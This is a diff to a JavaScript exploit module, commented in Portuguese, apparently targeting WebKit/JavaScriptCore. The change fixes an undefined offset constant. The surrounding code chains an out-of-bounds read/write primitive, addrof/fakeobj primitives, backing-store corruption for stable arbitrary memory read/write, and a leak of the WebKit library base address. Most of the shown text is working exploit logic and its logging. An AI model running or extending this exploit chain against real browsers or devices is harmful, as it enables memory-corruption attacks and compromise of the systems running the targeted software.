@@ -1,8 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v127 - R87 Correção de Referência de Constante)
+// js/script3/testArrayBufferVictimCrash.mjs (v127 - R87 Correção de Referência de Variável OOB_DV_BASE_ADDRESS_IN_OOB_BUFFER)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Corrigido o ReferenceError importando a constante 'OOB_DV_METADATA_BASE_IN_OOB_BUFFER'
-//   diretamente de core_exploit.mjs, garantindo que esteja definida no escopo correto.
+// - Corrigido ReferenceError para OOB_DV_BASE_ADDRESS_IN_OOB_BUFFER, declarando-o
+//   localmente em testArrayBufferVictimCrash.mjs com seu valor conhecido (0x58).
+// - Isso mantém a regra de não alterar core_exploit.mjs.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -11,13 +12,12 @@ import {
     triggerOOB_primitive,
     getOOBDataView,
     oob_read_absolute, 
-    oob_write_absolute,
-    OOB_DV_METADATA_BASE_IN_OOB_BUFFER // NOVO: Importa a constante aqui
+    oob_write_absolute 
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v127_R87_FixConstantRef";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v127_R87_OOBVarFix";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -41,7 +41,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Vazamento Direto da Structure do OOB DataView (Referência de Constante Corrigida) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Vazamento Direto da Structure do OOB DataView (Variável Corrigida) ---`, "test");
 
     let final_result = {
         success: false,
@@ -49,7 +49,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         webkit_base_addr: null
     };
 
-    // Primitivas de addrof/fakeobj (não serão usadas APÓS a Fase 4.)
+    // Primitivas de addrof/fakeobj (usadas APENAS na Fase 4)
     let confused_array;
     let victim_array;
     let addrof_func;
@@ -64,6 +64,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
     // Variáveis que não dependem mais de addrof_func para serem vazadas
     let oob_dataview_structure_addr = null;
+
+    // NOVO: Definir a constante localmente, já que não pode ser importada/exportada de core_exploit
+    const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; // Valor de core_exploit.mjs
 
     try {
         // Helper para definir as primitivas addrof/fakeobj (usadas APENAS na Fase 4)
@@ -140,14 +143,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // O 'oob_dataview_real' é um DataView, que é um tipo de ArrayBufferView.
         // Sua Structure está em seu offset 0x0. Vamos tentar vazar isso diretamente.
-        // O endereço base do oob_dataview_real é o seu offset 0x58 (OOB_DV_METADATA_BASE_IN_OOB_BUFFER)
-        // do ArrayBuffer (oob_array_buffer_real).
+        // Assumindo que o DataView 'oob_dataview_real' está no offset 0x58 (OOB_DV_METADATA_BASE_IN_OOB_BUFFER)
+        // do seu ArrayBuffer (oob_array_buffer_real).
         
-        // CORREÇÃO: Usar a constante importada OOB_DV_METADATA_BASE_IN_OOB_BUFFER
-        const structure_ptr_offset_from_oob_dv_start = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET; // JSCell (0x0)
-        oob_dataview_structure_addr = oob_read_absolute(structure_ptr_offset_from_oob_dv_start, 8); // Tenta ler 8 bytes
+        const structure_ptr_offset_from_oob_dv_base = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET; // JSCell (0x0)
+        oob_dataview_structure_addr = oob_read_absolute(structure_ptr_offset_from_oob_dv_base, 8); // Tenta ler 8 bytes
 
-        logS3(`[Etapa 1] Ponteiro da Structure (ou ID) do oob_dataview_real lido de offset ${toHex(structure_ptr_offset_from_oob_dv_start)}: ${oob_dataview_structure_addr.toString(true)}`, "leak");
+        logS3(`[Etapa 1] Ponteiro da Structure (ou ID) do oob_dataview_real lido de offset ${toHex(structure_ptr_offset_from_oob_dv_base)}: ${oob_dataview_structure_addr.toString(true)}`, "leak");
 
         // Agora, precisamos validar se isso é um ponteiro ou um ID
         let structure_addr = null;
@@ -158,7 +160,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             structure_addr = oob_dataview_structure_addr;
             logS3(`[DECISÃO] Vazamento de Structure Pointer direto do oob_dataview_real: ${structure_addr.toString(true)}`, "good");
         } 
-        // Se parece um StructureID (uint32, menor que 0x1000000, high part é zero)
+        // Se parece um StructureID (uint32, menor que 0x1000000)
         else if (oob_dataview_structure_addr.high() === 0 && oob_dataview_structure_addr.low() !== 0 && oob_dataview_structure_addr.low() < 0x1000000) {
             actual_structure_id = oob_dataview_structure_addr.low();
             logS3(`[DECISÃO] Vazamento de StructureID direto do oob_dataview_real: ${toHex(actual_structure_id)}`, "good");
@@ -177,8 +179,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // ============================================================================
         // CONSTRUÇÃO DA PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA ESTÁVEL (CORRUPÇÃO DE BACKING STORE)
-        // Isso ainda depende do addrof_func, que só funciona na Fase 4.
-        // Se o addrof_func da Fase 4 não for suficiente para 'arb_rw_array', teremos problemas aqui.
         // ============================================================================
         logS3("--- FASE 5.1: Construindo Primitiva de L/E Estável (Corrupção de Backing Store) ---", "subtest");
 
@@ -186,8 +186,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");
 
         // ATENÇÃO: Aqui ainda precisamos de addrof_func para o arb_rw_array.
-        // Se addrof_func não funcionar para o arb_rw_array (como vimos em testes anteriores para objetos comuns e AB),
-        // esta parte da cadeia de exploit falhará.
+        // Se addrof_func não funcionar para o arb_rw_array, esta parte falhará.
+        // A primitiva addrof_func é a da Fase 4, que funcionou lá.
         const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array); 
         logS3(`    Endereço do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
         if (arb_rw_array_ab_view_addr.equals(AdvancedInt64.Zero) || (arb_rw_array_ab_view_addr.high() >>> 16) !== 0x7FFF) {
@@ -239,7 +239,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
 
         // ============================================================================
-        // AGORA USAMOS A STRUCTURE VAZADA DO OOB_DATAVIEW_REAL
+        // AGORA USAMOS A STRUCTURE VAZADA DO OOB_DATAVIEW_REAL PARA VAZAR A BASE WEBKIT
         // ============================================================================
         
         // Continua com a Fase 3 (leitura da vfunc::put) usando o structure_addr encontrado
@@ -278,6 +278,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         arb_rw_array = null; 
         arb_read_stable = null;
         arb_write_stable = null;
+        // leak_target_obj e leak_target_addr não são mais relevantes para limpeza aqui
         
         logS3(`[${FNAME_CURRENT_TEST_BASE}] Limpeza final de referências concluída.`, "info");
     }
